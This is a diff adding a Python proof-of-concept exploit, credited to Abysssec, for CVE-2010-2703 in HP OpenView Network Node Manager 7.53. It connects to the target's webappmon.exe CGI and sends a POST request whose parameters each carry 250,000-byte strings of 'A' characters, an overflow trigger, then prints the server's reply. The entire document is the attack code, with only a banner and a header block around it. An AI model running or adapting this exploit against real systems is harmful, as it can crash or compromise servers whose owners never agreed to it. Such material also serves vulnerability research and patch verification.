@@ -1,0 +1,50 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+'''
+
+'''
+  Title              :  HP OpenView NNM webappmon.exe execvp_nc Remote Code Execution 
+  Version            :  OpenView Network Node Manager 7.53
+  Analysis           :  http://www.abysssec.com
+  Vendor             :  http://www.hp.com
+  Impact             :  Critical
+  Contact            :  shahin [at] abysssec.com , info  [at] abysssec.com
+  Twitter            :  @abysssec
+  CVE                :  CVE-2010-2703
+
+ http://www.exploit-db.com/moaub-6-hp-openview-nnm-webappmon-exe-execvp_nc-remote-code-execution/
+'''
+
+import socket,sys
+
+ip = "localhost"
+port = 80
+
+target = (ip, port)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+exp = "A"*250000
+headers = "POST /OvCgi/webappmon.exe HTTP/1.0\r\n"
+headers += "From: shahin@abysssec.com\r\n"
+headers += "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1;Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n"
+headers += "Content-Type: application/x-www-form-urlencoded\r\n"
+arg = 'ins=%s&sel=%s&app=%s&act=%s&arg=%s&help=%s&cache=1600 HTTP/1.1\r\n' % ("nowait", "localhost",exp,"ping",exp,exp) 
+headers += 'Content-Length: %d\r\n' %(len(arg))
+headers += "\r\n"
+headers += arg
+s.sendall(str(headers))
+while 1:
+    buf = s.recv(1000)
+    if not buf:
+        break
+    sys.stdout.write(buf)
+
+s.close()
+
